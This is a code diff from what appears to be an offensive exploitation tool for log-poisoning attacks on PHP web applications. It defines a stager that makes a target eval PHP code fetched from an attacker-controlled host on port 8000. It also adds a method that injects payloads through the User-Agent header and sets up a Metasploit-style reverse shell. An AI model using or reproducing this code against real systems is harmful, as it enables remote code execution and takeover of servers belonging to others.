@@ -3,20 +3,36 @@ from os.path import abspath, dirname, join
 
 from .utils import listener, attack, colors, cook, msf_payload
 
+from .Detection import Detection
+
 STAGER = "<?php eval(file_get_contents('http://{0}:8000/{1}.php'))?>"
 HERE = abspath(dirname(__file__))
 
 
 class Logs:
-    def __init__(self, target, location, nostager, relative, cookies):
+    def __init__(self, args):
 
-        self.target = target
-        self.location = location
-        self.nostager = nostager
-        self.relative = relative
-        self.cookies = cookies
+        self.target = args.url
+        self.location = args.location
+        self.nostager = args.nostager
+        self.relative = args.relative
+        self.cookies = args.cookies
+        self.detection = args.detection
+
+    def attack(self, payload):
+        headers = {'User-Agent': payload}
+        if self.cookies:
+            f_cookies = cook(self.cookies)
+            response = attack(self.target, self.location, headers=headers, cookies=f_cookies)
+        else:
+            response = attack(self.target, self.location, headers=headers)
+        return response
 
     def execute_logs(self):
+        if self.detection:
+            detector = Detection(self)
+            detector.detect()
+            return
 
         lhost, lport, shell = msf_payload()
         file = join(HERE, "Server.py")
